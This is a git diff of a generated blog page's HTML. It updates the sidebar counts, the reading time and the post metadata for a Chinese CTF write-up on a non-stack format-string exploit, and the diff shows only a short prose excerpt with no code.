         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        05:57
+        05:34
       </div>
     
     
@@ -506,15 +511,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">24</div>
+    <div class="sidebar-state-number">25</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">9</div>
+    <div class="sidebar-state-number">0</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -651,13 +656,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "zer00ne",
-          title: "LitCTF",
+          title: "非栈上的fmt",
           url: "https://khighl.github.io.git/2025/05/27/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84fmt/",
           excerpt: "",
           description: "",
           stripContent: "一次有趣的非栈上格式化字符串攻击参考:孤鸿师傅的博客 题目链接:NSS靶场 前言:litctf中出现的一道奇怪的题目,打完比赛后gets师傅告诉我这种题出现过几次,还甩给我一篇博客.结果打开一看,发现是楠哥的文章. 世界可真小 glibc的知识怎么永远学不完啊 题目分析 题目给了我们栈地址和libc地址,,并给了我们一次非栈上格式化字符串的机会,之后立马使用_exit(0)退出 由于使用的是_exit(0)我们无法使用exit_hook或FSOP 本题几乎是摆明了要让我们修改printf的返回地",
           date: "Tue May 27 2025 00:00:00 GMT+0800",
-          updated: "Tue May 27 2025 18:04:15 GMT+0800",
+          updated: "Tue Mar 24 2026 09:55:12 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
